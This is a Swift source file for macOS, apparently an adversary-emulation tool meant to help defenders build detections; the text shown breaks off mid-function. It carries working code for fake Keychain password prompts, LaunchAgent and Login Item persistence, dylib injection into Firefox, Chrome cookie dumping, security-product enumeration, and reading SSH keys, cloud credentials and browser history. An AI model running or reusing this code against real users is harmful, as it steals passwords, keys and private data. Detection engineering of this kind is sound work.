import Cocoa
import Foundation
import OSAKit
import SQLite3
import Security
import CoreServices
import SystemConfiguration
import SecurityFoundation
import AuthenticationServices
import IOKit

let black = "\u{001B}[0;30m"
       let red = "\u{001B}[0;31m"
       let green = "\u{001B}[0;32m"
       let yellow = "\u{001B}[0;33m"
       let blue = "\u{001B}[0;34m"
       let cyan = "\u{001B}[0;36m"
       let white = "\u{001B}[0;37m"
       let colorend = "\u{001B}[0;0m"
       let binname = CommandLine.arguments[0]
       var nm1 = ""
       var nm2 = ""


       func Banner(){
           print("\(cyan)+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\(colorend)")
           print("")
           print("Swift-Attck: Relevant unit tests to aid blue teamers in building macOS detections.")
           print("author: @cedowens")
           print("\(cyan)+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\(colorend)")


       }

       func Prompt1(){
           let proc = Process()
           proc.launchPath = "/usr/bin/osascript"
           let args : [String] = ["-e", ##"set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return default answer "" with icon file "System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns" with title "Authentication Needed" with hidden answer"##]
           proc.arguments = args
           let pipe = Pipe()
           proc.standardOutput = pipe
           proc.launch()
           let results = pipe.fileHandleForReading.readDataToEndOfFile()
           let output = String(data: results, encoding: String.Encoding.utf8)!
           print("===> Running prompt using the on disk osascript binary. Output:\(green)")
           print("\(output)\(colorend)")
           print("================================")
       }

       func Prompt2(){
       var info = ""

   let application = NSApplication.shared
   application.setActivationPolicy(.regular)
   application.activate(ignoringOtherApps: true)

   let alert = NSAlert()
   alert.window.title = "Authentication Needed"
   alert.messageText = "Keychain Access wants to use the login keychain"
   alert.informativeText = "Please enter the keychain password."
   alert.addButton(withTitle:"OK")
   alert.addButton(withTitle:"Cancel")
   let iconPath = "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FileVaultIcon.icns"
   let iconImg = NSImage(contentsOfFile: iconPath)
   alert.icon = iconImg

   let passfield = NSSecureTextField(frame: NSRect(x: 0, y: 0, width: 300, height: 24))
   alert.accessoryView = passfield

   let response = alert.runModal()
   if response == NSApplication.ModalResponse.alertFirstButtonReturn{
     info = "Creds captured: " + passfield.stringValue

   } else {

     info = "Cancel button clicked. Creds not captured."
   }
   print("===> Running prompt via NSAlert API calls. Output:\(green)")
   print("\(info)\(colorend)")
       }

func Clipboard1(){
    let proc = Process()
    proc.launchPath = "/bin/zsh"
    let args : [String] = ["-c", "echo \"MyTestClipboardString1\" | pbcopy && osascript -e 'return (the clipboard)'"]
    proc.arguments = args
    let pipe = Pipe()
    proc.standardOutput = pipe
    proc.launch()
    let results = pipe.fileHandleForReading.readDataToEndOfFile()
    let output = String(data: results, encoding: String.Encoding.utf8)!

    if output.contains("MyTestClipboardString1"){
        print("===> Copied the string \"MyTestClipboardString1\" onto the clibpoard and dumped clipboard contents via the osascript binary. Results:\(green)")
        print("\(output)\(colorend)")
    }
    else {
        print("===> Clipboard contents were not successfully copied. \(red)[-] This TTP did not successfully execute.\(colorend)")

    }

    print("================================")
}

func Clipboard2(){
    let pasteboard = NSPasteboard.general
    pasteboard.clearContents()
    pasteboard.setString("AnotherTestClipboardString", forType: .string)
    let pString = pasteboard.string(forType: .string)!

    if pString.contains("AnotherTestClipboardString"){
      print("===> Copied the string \"AnotherTestClipboardString\" onto the clipboard and dumped clipboard contents via NSPasteboard API Calls. Results:\(green)")
      print("\(pString)\(colorend)")
    }
    else {
        print("===> Clipboard contents were not successfully copied. \(red)[-] This TTP did not successfully execute.\(colorend)")

    }

    print("================================")

}

func LaunchAgent(){
    var canary = 0
    var retString = ""
    let fileMan = FileManager.default
    let username = NSUserName()
    print(" ===> Attempting to drop LaunchAgent persistence to open calc")


    do {
        let plist = """
         <?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE plist PUBLIC "-//Apple/DTD PLIST 1.0//EN"
         "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
         <plist version="1.0">
         <dict>
            <key>Label</key>
            <string>com.calctest.launchagent</string>
            <key>ProgramArguments</key>
            <array>
                <string>/usr/bin/open</string>
                <string>/System/Applications/Calculator.app</string>
            </array>
            <key>KeepAlive</key>
            <true/>
         </dict>
         </plist>
         """

        let plist2 = Data(plist.utf8)

        var isDir = ObjCBool(true)

        if fileMan.fileExists(atPath: "/Users/\(username)/Library/LaunchAgents", isDirectory: &isDir){

            print("/Users/\(username)/Library/LaunchAgents directory is already present, so writing plist...")

            try fileMan.createFile(atPath: "/Users/\(username)/Library/LaunchAgents/com.calctest.launchagent.plist", contents: plist2, attributes: nil)


        } else {

            print("/Users/\(username)/Library/LaunchAgents directory is not present, so creating that directory and then writing the plist...")

            try fileMan.createDirectory(at: URL(fileURLWithPath: "/Users/\(username)/Library/LaunchAgents"), withIntermediateDirectories: false)

            try fileMan.createFile(atPath: "/Users/\(username)/Library/LaunchAgents/com.calctest.launchagent.plist", contents: plist2, attributes: nil)
        }



        let proc = Process()
        proc.launchPath = "/bin/launchctl"
        let args : [String] = ["load","-w", "/Users/\(username)/Library/LaunchAgents/com.calctest.launchagent.plist"]
        proc.arguments = args
        let pipe = Pipe()
        proc.standardOutput = pipe
        proc.launch()
        let results = pipe.fileHandleForReading.readDataToEndOfFile()
        let output = String(data: results, encoding: String.Encoding.utf8)!

        if fileMan.fileExists(atPath: "/Users/\(username)/Library/LaunchAgents/com.calctest.launchagent.plist"){
            retString = "[+] Successfully loaded com.calctest.launchagent.plist"
            canary = 1

        }else {
            retString = "[!] This TTP failed to execute. Launch Agent not created"
        }


    }catch let error {

        print(error)

    }

    print("===> Attempting to drop com.calctest.launchagent.plist to ~/Library/LaunchAgents, which will simply run calc. Note: On Ventura, if successful the OS will display a \"Background Items Added\" notification for this launch agent addition, which is great! Additionally, though this TTP uses launchctl to immediately load the plist, you can simply drop the plist and wait for reboot, where launchd will automatically load it. Results:\(green)")
    print("\(retString)\(colorend)")

    if canary == 1 {
    print("===> Sleeping for 10 seconds and then will perform clean-up of the launch agent....")
    sleep(10)

    let username = NSUserName()
    let proc = Process()
    proc.launchPath = "/bin/zsh"
    let args : [String] = ["-c", "launchctl unload -w /Users/\(username)/Library/LaunchAgents/com.calctest.launchagent.plist && rm /Users/\(username)/Library/LaunchAgents/com.calctest.launchagent.plist"]
    proc.arguments = args
    let pipe = Pipe()
    proc.standardOutput = pipe
    proc.launch()
    let results = pipe.fileHandleForReading.readDataToEndOfFile()
    let output = String(data: results, encoding: String.Encoding.utf8)!

    print("\(green)[+] Successfully unloaded and deleted com.calctest.launchagent\(colorend)")

    }

    print("================================")


}

func LoginItem(){
var retString = ""
var canary = 0
print("===> Attempting to create Login Item persistence to open calc. Results:\(green)")

    do {

	      let jxa =
        """
        ObjC.import('CoreServices');
        ObjC.import('Security');
        ObjC.import('SystemConfiguration');
        let temp = $.CFURLCreateFromFileSystemRepresentation($.kCFAllocatorDefault, "/System/Applications/Calculator.app", "/System/Applications/Calculator.app".length, false);
        //let items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListGlobalLoginItems, $.nil);
        let items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListSessionLoginItems, $.nil);
        let cfName = $.CFStringCreateWithCString($.nil, "Calculator.app", $.kCFStringEncodingASCII);
        let itemRef = $.LSSharedFileListInsertItemURL(items, $.kLSSharedFileListItemLast, cfName, $.nil, temp, $.nil, $.nil);
        console.log("[+] Calculator.app successfully added as a Login Item");
        """

        let script = OSAScript.init(source: jxa, language: OSALanguage.init(forName: "JavaScript"))
        var compileErr : NSDictionary?
        script.executeAndReturnError(&compileErr)
        var scriptErr : NSDictionary?
        script.executeAndReturnError(&scriptErr)

        retString = "[+] Calculator.app successfully added as a Login Item"
        canary = 1


    } catch let error {
        retString = "[-] Error: \(error)"
    }

    print("\(retString)\(colorend)")

    if canary == 1{
    print("===> Sleeping for 10 seconds and then will perform clean-up of the login item....")
    sleep(10)

    let temp = CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault, "/System/Applications/Calculator.app", "/System/Applications/Calculator.app".count, false)
		var items = LSSharedFileListCreate(nil, kLSSharedFileListSessionLoginItems.takeUnretainedValue(), nil)?.takeUnretainedValue() as LSSharedFileList?
		var cfName = CFStringCreateWithCString(nil, "Calculator.app", kCFStringEncodingASCII)
		var loginItems = (LSSharedFileListCopySnapshot(items!, nil)?.takeRetainedValue())! as! Array<Any>

    for each in loginItems{
    			if "\(each)".contains("Calculator.app"){
        			var result = LSSharedFileListItemRemove(items!, each as! LSSharedFileListItem)
        			print("\(green)[+] Calculator successfully removed from Login Items\(colorend)")
    			}

		}



    }

    print("================================")

}

func CopyKeychain(){
    let fileMan = FileManager.default
    let username = NSUserName()
    print(" ===> Attempting to copy the user's keychain databaset to the /tmp directory. Results:")
    do {
        try fileMan.copyItem(atPath: "/Users/\(username)/Library/Keychains/login.keychain-db", toPath: "/tmp/keychain-moved-db")

        if fileMan.fileExists(atPath: "/tmp/keychain-moved-db"){
            print("\(green) [+] Successfully copied the user's keychain db to /tmp/keychain-moved-db.\(colorend)")
            print("===> Sleeping for 10 seconds and then will clean up the /tmp/keychain-moved-db file...")
            sleep(10)
            try fileMan.removeItem(atPath: "/tmp/keychain-moved-db")
		        print("\(green) [+] Successfully removed /tmp/keychain-moved-db")
        } else {
            print("\(red) [-] Attempt to copy the user's keychain to /tmp/keychain-moved-db was unsuccessful.\(colorend)")
        }


    } catch let error {


    }
}

func getDocumentsDirectory() -> URL {
    let paths = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)
    return paths[0]
}

func InjectDylib(){
    print(" ===> Attempting to inject a dylib into /Applications/Firefox.app. Result:")

    var size = 0
    var mach = "hw.machine".cString(using: .utf8)
    sysctlbyname(mach, nil, &size, nil, 0)
    var machine = [CChar](repeating: 0, count: Int(size))
    sysctlbyname(mach, &machine, &size, nil, 0)
    var arch = String(cString: machine)

    var dylibname = "calc-intel"
    if arch == "arm64"{
        dylibname = "calc"
    }

    let binpath = URL(fileURLWithPath: "/Applications/Firefox.app")
    let maliciousDylibPath = Bundle.main.path(forResource: dylibname, ofType: "dylib")

    let conf = NSWorkspace.OpenConfiguration.init()
    conf.hides = true
    conf.activates = true
    conf.createsNewApplicationInstance = true
    conf.environment = ["DYLD_INSERT_LIBRARIES" : maliciousDylibPath!]


    NSWorkspace.shared.openApplication(at: binpath, configuration: conf, completionHandler: {(myapp,error) in
        if let error = error {
            print(error)
        }
        else {

        }
    })

    sleep(5)

    let myWorkspace = NSWorkspace.shared
    let processes = myWorkspace.runningApplications
    var procList = [String]()
    for i in processes {
        let str1 = "\(i)"
        procList.append(str1)

    }
    let processes2 = procList.joined(separator: ", ")

    if processes2.contains("com.apple.calculator") {
        print("\(green) [+] Successfully injected calc into Firefox.\(colorend)")
    } else {
        print("\(red) [-] Calc NOT successfully injected into Firefox. TTP did not succeed.\(colorend)")
    }
}

func DumpCookies(){
    let username = NSUserName()
    print("===> Attempting to dump Chrome cookies using the WhiteChcolateMacademiaNut tool.")
    let fileMan = FileManager.default

    let dispatch = DispatchQueue.global(qos: .background)
    dispatch.async {
      do {
      let proc = Process()
      proc.launchPath = "/bin/zsh"
      let args : [String] = ["-c","/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --remote-debugging-port=1337 --headless --user-data-dir=\"/Users/\(username)/Library/Application\\ Support/Google/Chrome\" &"]

      print(args)

      proc.arguments = args
      let pipe = Pipe()
      proc.standardOutput = pipe
      try proc.launch()
      let results = pipe.fileHandleForReading.readDataToEndOfFile()
      let output = String(data: results, encoding: String.Encoding.utf8)!
      print("\(green) [+] Successfully ran Chrome in headless mode with the remote debugger port...\(colorend)")

      } catch let error {
      print("\(red)\(error)\(colorend)")
      }
    }

      let proc2 = Process()
      proc2.launchPath = "/bin/zsh"
      let args2 : [String] = ["-c","git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut && cd WhiteChocolateMacademiaNut && go mod init WhiteChocolateMacademiaNut/v2 && go get github.com/akamensky/argparse && go get golang.org/x/net/websocket && go build && ./WhiteChocolateMacademiaNut --port 1337 --dump cookies --format raw"]
      proc2.arguments = args2
      let pipe2 = Pipe()
      proc2.standardOutput = pipe2
      try proc2.launch()
      let results2 = pipe2.fileHandleForReading.readDataToEndOfFile()
      let output2 = String(data: results2, encoding: String.Encoding.utf8)!
      print("\(green)\(output2)\(colorend)")

      if output2.contains("cookies"){
        print("\(green)[+] TTP Successfully executed.\(colorend)")
        } else {
        print("\(red)[-] TTP NOT successfull executed.\(colorend)")
        }



}

func Screenshot1(){
    let proc = Process()
    proc.launchPath = "/usr/sbin/screencapture"
    let args : [String] = ["-x","-t","jpg","out.jpg"]
    proc.arguments = args
    let pipe = Pipe()
    proc.standardOutput = pipe
    proc.launch()
    let results = pipe.fileHandleForReading.readDataToEndOfFile()
    let output = String(data: results, encoding: String.Encoding.utf8)!
    print("===> Attempting to grab a screenshot using the on-disk screencapture binary. The screenshot will be written to out.jpg in the current directory. If you have not granted Screen Recording TCC Permissions to this binary, then the screenshot will not have any desktop items.\(green)")
    print("\(output)\(colorend)")
    print("================================")
}


func Screenshot2(){
    var displayCount: UInt32 = 0;
    var result = CGGetActiveDisplayList(0, nil, &displayCount)
    let allocated = Int(displayCount)
    let activeDisplays = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: allocated)
    result = CGGetActiveDisplayList(displayCount, activeDisplays, &displayCount)
    for i in 1...displayCount{
        let screenShot:CGImage = CGDisplayCreateImage(activeDisplays[Int(i-1)])!
        let bitmapRep = NSBitmapImageRep(cgImage: screenShot)
        let jpegData = bitmapRep.representation(using: NSBitmapImageRep.FileType.jpeg, properties: [:])!
        let path = FileManager.default.urls(for: .downloadsDirectory, in: .userDomainMask)
        let filename = getDocumentsDirectory().appendingPathComponent("screenshot.jpg")
        do {
           try jpegData.write(to: filename)
        }
        catch let error {
            print(error)
        }
        print("===> Attempting to grab a screenshot using the on-disk screencapture binary. The screenshot will be written to out.jpg in the current directory. If you have not granted Screen Recording TCC Permissions to this binary, then the screenshot will not have any desktop items.\(green)")
        print("================================")
}
}

func Userhist(){
    do {
        let uname = NSUserName()
        let histPath = URL(fileURLWithPath: "/Users/\(uname)/.zsh_history", isDirectory: true)
        let histData = try String(contentsOf: histPath)

        print("===> Attempting to read zsh history.\(green)")
        print("\(histData)\(colorend)")
        print("================================")

    } catch let error{
        print(error)
    }
}

func AVEnum(){
    do {
        var isDir = ObjCBool(true)
        let fileMan = FileManager.default
        let myWorkspace = NSWorkspace.shared
        let processes = myWorkspace.runningApplications
        var procList = [String]()
        for i in processes {
            let str1 = "\(i)"
            procList.append(str1)
        }
        let processes2 = procList.joined(separator: ", ")
        var b = 0

        print("===> Attempting to check for security products...\(green)")

        if processes2.contains("CbOsxSensorService") || fileMan.fileExists(atPath: "/Applications/CarbonBlack/CbOsxSensorService"){
            print("\(green)[+] Carbon Black OSX Sensor installed.\(colorend)")
            b = 1
        }
        if processes2.contains("CbDefense") || fileMan.fileExists(atPath: "/Applications/Confer.app",isDirectory: &isDir){
            print("\(green)[+] Carbon Black Defense A/V installed\(colorend)")
            b = 1
        }
        if processes2.contains("ESET") || processes2.contains("eset") || fileMan.fileExists(atPath: "Library/Application Support/com.eset.remoteadministrator.agent",isDirectory: &isDir){
            print("\(green)[+] ESET A/V installed\(colorend)")
            b = 1
        }
        if processes2.contains("Littlesnitch") || processes2.contains("Snitch") || fileMan.fileExists(atPath: "/Library/Little Snitch/", isDirectory: &isDir) {
            print("\(green)[+] Little snitch firewall found\(colorend)")
            b = 1
        }
        if processes2.contains("xagt") || fileMan.fileExists(atPath: "/Library/FireEye/xagt",isDirectory: &isDir) {
            print("\(green)[+] FireEye HX agent installed\(colorend)")
            b = 1
        }
        if processes2.contains("falconctl") || fileMan.fileExists(atPath: "/Library/CS/falcond") || fileMan.fileExists(atPath: "/Applications/Falcon.app/Contents/Resources") {
            print("\(green)[+] Crowdstrike Falcon agent found\(colorend)")
            b = 1
        }
        if processes2.contains("OpenDNS") || processes2.contains("opendns") || fileMan.fileExists(atPath: "/Library/Application Support/OpenDNS Roaming Client/dns-updater") {
            print("\(green)[+] OpenDNS Client running\(colorend)")
            b = 1
        }
        if processes2.contains("SentinelOne") || processes2.contains("sentinelone"){
            print("\(green)[+] SentinelOne agent running\(colorend)")
            b = 1
        }
        if processes2.contains("GlobalProtect") || processes2.contains("/PanGPS") || fileMan.fileExists(atPath: "/Library/Logs/PaloAltoNetworks/GlobalProtect",isDirectory: &isDir) || fileMan.fileExists(atPath: "/Library/PaloAltoNetworks",isDirectory: &isDir){
            print("\(green)[+] Global Protect PAN VPN client running\(colorend)")
            b = 1
        }
        if processes2.contains("HostChecker") || processes2.contains("pulsesecure") || fileMan.fileExists(atPath: "/Applications/Pulse Secure.app",isDirectory: &isDir) || processes2.contains("Pulse-Secure"){
            print("\(green)[+] Pulse VPN client running\(colorend)")
            b = 1
        }
        if processes2.contains("AMP-for-Endpoints") || fileMan.fileExists(atPath: "/opt/cisco/amp",isDirectory: &isDir){
            print("\(green)[+] Cisco AMP for endpoints found\(colorend)")
            b = 1
        }
        if fileMan.fileExists(atPath: "/usr/local/bin/jamf") || fileMan.fileExists(atPath: "/usr/local/jamf"){
            print("\(green)[+] JAMF found on this host\(colorend)")
            b = 1
        }
        if fileMan.fileExists(atPath: "/Library/Application Support/Malwarebytes",isDirectory: &isDir){
            print("\(green)[+] Malwarebytes A/V found on this host\(colorend)")
            b = 1
        }
        if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
            print("\(green)[+] osqueryi found\(colorend)")
            b = 1
        }
        if fileMan.fileExists(atPath: "/Library/Sophos Anti-Virus/",isDirectory: &isDir){
            print("\(green)[+] Sophos antivirus found\(colorend)")
            b = 1
        }
        if processes2.contains("lulu") || fileMan.fileExists(atPath: "/Library/Objective-See/Lulu",isDirectory: &isDir) || fileMan.fileExists(atPath: "/Applications/LuLu.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See LuLu firewall found\(colorend)")
            b = 1
        }
        if processes2.contains("dnd") || fileMan.fileExists(atPath: "/Library/Objective-See/DND",isDirectory: &isDir) || fileMan.fileExists(atPath: "/Applications/Do Not Disturb.app/",isDirectory: &isDir) {
            print("\(green)[+] Objective-See Do Not Disturb, physical access detection tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("WhatsYourSign") || fileMan.fileExists(atPath: "/Applications/WhatsYourSign.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See Whats Your Sign, code signature information tool, found\(colorend)")
            b = 1
        }
        // Knock Knock
        if processes2.contains("KnockKnock") || fileMan.fileExists(atPath: "/Applications/KnockKnock.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See Knock Knock, persistent software detection tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("reikey") || fileMan.fileExists(atPath: "/Applications/ReiKey.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See ReiKey, keyboard event taps detection tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("OverSight") || fileMan.fileExists(atPath: "/Applications/OverSight.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See Over Sight, microphone and camera monitor tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("KextViewr") || fileMan.fileExists(atPath: "/Applications/KextViewr.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See KextViewr, kernel module detection tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("blockblock") || fileMan.fileExists(atPath: "/Applications/BlockBlock Helper.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See Block Block, persistent location monitoring tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("Netiquette") || fileMan.fileExists(atPath: "/Applications/Netiquette.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See Netiquette, network monitoring tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("processmonitor") || fileMan.fileExists(atPath: "/Applications/ProcessMonitor.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See ProcessMonitor, process monitoring tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("filemonitor") || fileMan.fileExists(atPath: "/Applications/FileMonitor.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See FileMonitor, file monitoring tool, found\(colorend)")
            b = 1
        }

        if b == 0{
            print("[-] No security products found.")
        }

    } catch {
        print("\(red)[-] Error listing running applications\(colorend)")
    }
      print("================================")
}

func SystemInfo1(){
    let proc = Process()
       proc.launchPath = "/usr/bin/osascript"
       let args : [String] = ["-e",##"return (system info)"##]
       proc.arguments = args
       let pipe = Pipe()
       proc.standardOutput = pipe
       proc.launch()
       let results = pipe.fileHandleForReading.readDataToEndOfFile()
       let output = String(data: results, encoding: String.Encoding.utf8)!
       print("===> Grabbing basic system info using the on-disk osascript binary. Results:\(green)")
       print("\(output)\(colorend)")
       print("================================")
}

func SystemInfo2(){
    //var application = NSApplication.shared
    //application.activate(ignoringOtherApps: true)


       let source = ##"return (system info)"##

       if let script = NSAppleScript(source: source){
           var error : NSDictionary?
           let result = script.executeAndReturnError(&error)
           if let err = error {
               print(err)
           }
        print("===> Grabbing basic systeminfo using API calls. Results:\(green)")
        print("\(result)\(colorend)")
        print("================================")
       }
}

func KeySearch(){
    print("===> Attempting to check for ssh/aws/gcp/azure key files on the host...\(green)")
    var isDir = ObjCBool(true)
    let fileMan = FileManager.default
    let uName = NSUserName()

    //----ssh key search
    if fileMan.fileExists(atPath: "/Users/\(uName)/.ssh",isDirectory: &isDir){
        print("\(colorend)==>SSH Key Info Found:\(green)")
        let enumerator = fileMan.enumerator(atPath: "/Users/\(uName)/.ssh")
        while let each = enumerator?.nextObject() as? String {
            do {
                print("\(colorend)\(each):\(green)")
                let fileData = "/Users/\(uName)/.ssh/\(each)"
                let fileData2 = try String(contentsOfFile: fileData)
                if fileData2 != nil {
                    print(fileData2)
                }

            } catch {
                print("\(red)[-] Error attempting to get file contents for /Users/\(uName)/.ssh/\(each)\(colorend)\n")
            }

        }

    } else {
        print("\(red)[-] ~/.ssh directory not found on this host\(colorend)")


}
    //-------------------------

    print("")

    //----aws key search
    if fileMan.fileExists(atPath: "/Users/\(uName)/.aws",isDirectory: &isDir){
        print("\(colorend)==>AWS Info Found:\(green)")
        let enumerator = fileMan.enumerator(atPath: "/Users/\(uName)/.aws")
        while let each = enumerator?.nextObject() as? String {
            do {
                print("\(colorend)\(each):\(green)")
                let fileData = "/Users/\(uName)/.aws/\(each)"
                let fileData2 = try String(contentsOfFile: fileData)
                if fileData2 != nil {
                    print(fileData2)
                }

            } catch {
                print("\(red)[-] Error attempting to get file contents for /Users/\(uName)/.aws/\(each)\(colorend)\n")
            }
        }
    } else {
        print("\(red)[-] ~/.aws directory not found on this host\(colorend)")
    }

    print("")

    //-----------------------

    //-----gcloud creds search
    if fileMan.fileExists(atPath: "/Users/\(uName)/.config/gcloud/credentials.db"){
        do {
            print("\(colorend)==>GCP gcloud Info Found:\(green)")
            var db : OpaquePointer?
            let dbURL = URL(fileURLWithPath: "/Users/\(uName)/.config/gcloud/credentials.db")
            if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
                print("\(red)[-] Could not open the gcloud credentials database\(colorend)")
            } else {
                let queryString = "select * from credentials;"
                var queryStatement: OpaquePointer? = nil
                if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                    while sqlite3_step(queryStatement) == SQLITE_ROW{
                        let col1 = sqlite3_column_text(queryStatement, 0)
                        if col1 != nil{
                            nm1 = String(cString: col1!)
                        }
                        let col2 = sqlite3_column_text(queryStatement, 1)
                        if col2 != nil{
                            nm2 = String(cString: col2!)
                        }
                        print("account_id: \(nm1)  |  value: \(nm2)")
                    }
                    sqlite3_finalize(queryStatement)
                }
            }

        }
        catch {
            print("\(red)[-] Error attempting to get contents of ~/.config/gcloud/credentials.db\(colorend)")
        }

    } else {
        print("\(red)[-] ~/.config/gcloud/credentials.db not found on this host\(colorend)")
    }

    print("")

    ///------------------

    //-----azure creds search
    if fileMan.fileExists(atPath: "/Users/\(uName)/.azure",isDirectory: &isDir){
        print("\(colorend)==>Azure Info Found:\(green)")

        let azureProfilePath = "/Users/\(uName)/.azure/azureProfile.json"
        do {
            let azureProfileContents = try String(contentsOfFile: azureProfilePath)

            print(azureProfilePath)
            print(azureProfileContents)
            print("")
        } catch {
            print("\(red)[-] Error attempting to get file contents for \(azureProfilePath)\(colorend)\n")
        }

        let azureTokensPath = "/Users/\(uName)/.azure/accessTokens.json"
        do {
            let azureTokensContents = try String(contentsOfFile: azureTokensPath)

            print(azureTokensPath)
            print(azureTokensContents)
        } catch {
            print("\(red)[-] Error attempting to get file contents for \(azureTokensPath)\(colorend)\n")
        }
    } else {
        print("\(red)[-] ~/.azure directory not found on this host\(colorend)")
    }
}

func BrowserHist(){
    print("===> Attempting to grab quarantine and browser history for Safari/Firefox/Chrome...\(green)")

    let fileMan = FileManager()
    var nm1 = ""
    var nm2 = ""
    var nm3 = ""
    var nm4 = ""
    var visitDate = ""
    var histURL = ""
    var cVisitDate = ""
    var cUrl = ""
    var cTitle = ""
    var ffoxDate = ""
    var ffoxURL = ""

    var isDir = ObjCBool(true)
    let username = NSUserName()

    //quarantine history
    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2", isDirectory: &isDir){
        print("")
        print("\(green)***************Quarantine History Results for user \(username)***************\(colorend)")
                    var db : OpaquePointer?
                    let dbURL = URL(fileURLWithPath: "/Users/\(username)/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2")
                    if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
                        print("\(red)[-] Could not open quarantive events database.\(colorend)")
                    }else {

                        let queryString = "select datetime(LSQuarantineTimeStamp, 'unixepoch') as last_visited, LSQuarantineAgentBundleIdentifier, LSQuarantineDataURLString, LSQuarantineOriginURLString from LSQuarantineEvent where LSQuarantineDataURLString is not null order by last_visited;"

                        var queryStatement: OpaquePointer? = nil

                        if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                            while sqlite3_step(queryStatement) == SQLITE_ROW {
                                let col1 = sqlite3_column_text(queryStatement, 0)
                                if col1 != nil{
                                    nm1 = String(cString: col1!)

                                }

                                let col2 = sqlite3_column_text(queryStatement, 1)
                                if col2 != nil{
                                    nm2 = String(cString: col2!)
                                }

                                let col3 = sqlite3_column_text(queryStatement, 2)
                                if col3 != nil{
                                    nm3 = String(cString:col3!)
                                }


                                let col4 = sqlite3_column_text(queryStatement, 3)
                                if col4 != nil{
                                    nm4 = String(cString: col4!)
                                }


                                print("Date: \(nm1) | App: \(nm2) | File: \(nm3) | OriginURL: \(nm4)")

                            }
        //
                            sqlite3_finalize(queryStatement)

                        }



                    }

    }else {
        print("\(red)[-] QuarantineEventsV2 database not found for user \(username)\(colorend)")
    }

    //safari history check
    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Safari/History.db", isDirectory: &isDir){
        print("")
        print("\(green)***************Safari history results for user \(username)***************\(colorend)")
        var db : OpaquePointer?
        let dbURL = URL(fileURLWithPath: "/Users/\(username)/Library/Safari/History.db")
        if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
            print("\(red)[-] Could not open the Safari History.db file for user \(username)\(colorend)")
        }else {
            //let queryString = "select history_visits.visit_time, history_items.url from history_visits, history_items where history_visits.history_item=history_items.id;"
            let queryString = "select datetime(history_visits.visit_time + 978307200, 'unixepoch') as last_visited, history_items.url from history_visits, history_items where history_visits.history_item=history_items.id order by last_visited;"
            var queryStatement: OpaquePointer? = nil

            if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                while sqlite3_step(queryStatement) == SQLITE_ROW{
                    let col1 = sqlite3_column_text(queryStatement, 0)
                    if col1 != nil{
                        visitDate = String(cString: col1!)

                    }
                    let col2 = sqlite3_column_text(queryStatement, 1)
                    if col2 != nil{
                        histURL = String(cString: col2!)

                    }

                    print("Date: \(visitDate) | URL: \(histURL)")

                }
                sqlite3_finalize(queryStatement)

            }

        }
    }
    else {
        print("\(red)[-] Safari History.db database not found for user \(username)\(colorend)")
    }

    //chrome history check
    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Application Support/Google/Chrome/Default/History", isDirectory: &isDir){
        print("")
        print("\(green)***************Chrome history results for user \(username)***************\(colorend)")
        var db : OpaquePointer?
        let dbURL = URL(fileURLWithPath: "/Users/\(username)/Library/Application Support/Google/Chrome/Default/History")

        if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
            print("\(red)[-] Could not open the Chrome history database file for user \(username)\(colorend)")

        } else{

            let queryString = "select datetime(last_visit_time/1000000-11644473600, \"unixepoch\") as last_visited, url, title from urls order by last_visited;"

            var queryStatement: OpaquePointer? = nil

            if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{

                while sqlite3_step(queryStatement) == SQLITE_ROW{


                    let col1 = sqlite3_column_text(queryStatement, 0)
                    if col1 != nil{
                        cVisitDate = String(cString: col1!)

                    }

                    let col2 = sqlite3_column_text(queryStatement, 1)
                    if col2 != nil{
                        cUrl = String(cString: col2!)

                    }

                    let col3 = sqlite3_column_text(queryStatement, 2)
                    if col3 != nil{
                        cTitle = String(cString: col3!)

                    }


                     print("Date: \(cVisitDate) | URL: \(cUrl) | Title: \(cTitle)")

                }

                sqlite3_finalize(queryStatement)

            }
            else {
                print("\(red)[-] Issue with preparing the Chrome History database...this may be because something is currently writing to it (i.e., an active Chrome browser)...kill the browser and try again\(colorend)")
            }

        }
    }
    else{
